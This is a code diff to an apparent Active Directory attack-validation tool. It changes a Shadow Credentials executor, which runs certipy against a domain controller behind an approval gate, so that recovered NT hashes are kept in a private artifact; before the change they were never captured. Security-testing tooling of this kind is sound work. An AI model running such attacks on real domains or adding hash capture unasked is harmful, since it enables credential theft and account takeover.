@@ -12,8 +12,8 @@ the original attribute. The terminal proof is ``secret_recovered`` (the NT hash
 was recovered); the rollback is the attribute restore, and its success marker
 sets ``rollback.verified``.
 
-The recovered NT hash is a SECRET: it is never parsed into a variable, stored in
-a step note, or placed in the receipt (``proof.scrub`` also drops any
+The recovered NT hash is a SECRET: it is held only in the private reveal
+artifact, never stored in a step note or placed in the receipt (``proof.scrub`` also drops any
 hash-marked key defensively). The terminal fact's token is over public
 identifiers only (technique, domain, victim account).
 
@@ -36,11 +36,12 @@ from typing import Any
 
 from ..recommend import ParamSpec, ParamValue, values
 from .. import proof
-from .base import (ValidationExecutor, ExecutorContext, StepRecord, RunResult,
+from ._reveal_common import pkinit_hashes
+from .base import (SecretReveal, ValidationExecutor, ExecutorContext, StepRecord, RunResult,
                    redact_argv)
 
 
-# shadow-auto hash-recovery markers (presence only -- the hash is NEVER captured).
+# Shadow-auto proof markers; secret capture is separate from this predicate.
 _RE_SHADOW_HASH = re.compile(
     r"(Got hash for|NT hash for '[^']+':|[0-9a-f]{32}:[0-9a-f]{32})", re.I)
 # shadow-auto restore markers -- PAST-TENSE SUCCESS ONLY. certipy prints the
@@ -119,7 +120,18 @@ class ShadowCredsExecutor(ValidationExecutor):
         return argv
 
     # ---------------------------------------------------------------- execute
+    def revealed_secrets(self, artifact: dict) -> list[SecretReveal]:
+        return list(artifact.get("_reveal", []))
+
     def execute(self, ctx: ExecutorContext, finding, params: dict[str, ParamValue]) -> dict:
+        # Private recovery channel, populated before downstream proof/cleanup.
+        artifact = {"_reveal": []}
+        ctx._pending_reveal_artifact = artifact
+
+        def finish_artifact(*args):
+            artifact.update(self._artifact(*args))
+            return artifact
+
         cfg = ctx.config
         v = values(params)
         account = v["account"]
@@ -143,7 +155,7 @@ class ShadowCredsExecutor(ValidationExecutor):
             gate["classifier"] = "denied"
             gate["op"] = "shadow_write"
             errors.append("gate_denied:shadow_write")
-            return self._artifact(steps, gate, mutation, None, False, errors)
+            return finish_artifact(steps, gate, mutation, None, False, errors)
         if verdict == "approved":
             gate["classifier"] = "approved"
             gate["op"] = "shadow_write"
@@ -152,7 +164,8 @@ class ShadowCredsExecutor(ValidationExecutor):
                        *self._op_auth_argv(cfg), "-dc-ip", dc]
         res = ctx.runner.run(shadow_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
         out = (res.stdout or "") + (res.stderr or "")
-        # Presence-only predicates -- the recovered hash is NEVER captured.
+        artifact["_reveal"].extend(pkinit_hashes(self.technique, account, out))
+        # Proof remains a public presence predicate.
         hash_ok = bool(_RE_SHADOW_HASH.search(out))
         restore_ok = bool(_RE_SHADOW_RESTORE.search(out))
         record("shadow_auto", shadow_argv, res, hash_ok,
@@ -168,7 +181,7 @@ class ShadowCredsExecutor(ValidationExecutor):
 
         if not hash_ok:
             errors.append("shadow_no_hash")
-            return self._artifact(steps, gate, mutation, None, False, errors)
+            return finish_artifact(steps, gate, mutation, None, False, errors)
 
         terminal_fact = proof.build_terminal_fact(
             self.terminal_kind, ok=hash_ok,
@@ -179,7 +192,7 @@ class ShadowCredsExecutor(ValidationExecutor):
             extra={"account": account},
         )
         complete = hash_ok
-        return self._artifact(steps, gate, mutation, terminal_fact, complete, errors)
+        return finish_artifact(steps, gate, mutation, terminal_fact, complete, errors)
 
     @staticmethod
     def _artifact(steps, gate, mutation, terminal_fact, complete, errors) -> dict:
